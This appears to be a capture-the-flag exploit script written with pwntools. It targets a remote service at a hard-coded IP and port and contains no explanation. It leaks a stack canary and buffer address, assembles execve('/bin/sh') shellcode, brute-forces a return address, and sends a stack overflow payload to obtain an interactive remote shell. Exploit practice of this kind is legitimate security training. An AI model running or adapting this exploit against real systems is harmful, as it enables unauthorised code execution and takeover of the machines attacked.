from pwn import *
# context.log_level="debug"
def bp():
    for i in range(0,0x600, 4):
        p = remote("44.197.231.105", 3004)
        p.recvuntil("value: 0x")
        canary = int((p.recv(8).ljust(8, b"\x00")).decode().split(")")[0],16)
        info(str(hex(canary)))
        p.recvuntil("at 0x")
        buf = int(p.recv(8).ljust(8, b"\x00"),16)
        info(str(hex(buf)))

        bin = hex(u32(b"/bin"))
        sh=hex(u32(b"/sh\0"))
        start=0x8047000
        shell = f'''
        mov al,0xb
        push {sh}
        push {bin}
        mov ebx, esp
        xor ecx,ecx
        xor edx,edx
        int 0x80
        '''
        shell = asm(shell)


        # p.sendlineafter(": ",shell+b"A"*(20-len(shell))+p32(canary)+p32(start)*(32))
        # p.interactive() 
        info("testing: "+str(hex(start+i)))
        p.sendlineafter(": ",b"A"*(20)+p32(canary)+p32(start+i)*(8)+b"BBBB"+p32(buf))
        p.readuntil("return address (")
        p.readuntil("--------------------------\n")
        try:
            if b"AAAA"*3 == p.recv(12):
                print(i)
                input()
                # break
        except:
            p.close()

def go():
    context.log_level="debug"
    p = remote("44.197.231.105", 3004)
    p.recvuntil("value: 0x")
    canary = int((p.recv(8).ljust(8, b"\x00")).decode().split(")")[0],16)
    info(str(hex(canary)))
    p.recvuntil("at 0x")
    buf = int(p.recv(8).ljust(8, b"\x00"),16)
    info(str(hex(buf)))

    bin = hex(u32(b"/bin"))
    sh=hex(u32(b"/sh\0"))
    start=0x8047000
    shell = f'''
    mov al,0xb
    push {sh}
    push {bin}
    mov ebx, esp
    xor ecx,ecx
    xor edx,edx
    int 0x80
    '''
    shell = asm(shell)


    # p.sendlineafter(": ",shell+b"A"*(20-len(shell))+p32(canary)+p32(start)*(32))
    # p.interactive() 
    info("testing: "+str(hex(start+200)))
    p.sendlineafter(": ",b"A"*(20)+p32(canary)+p32(start+200)*(8)+b"BBBB"+p32(buf))
    p.interactive()
# go()
bp()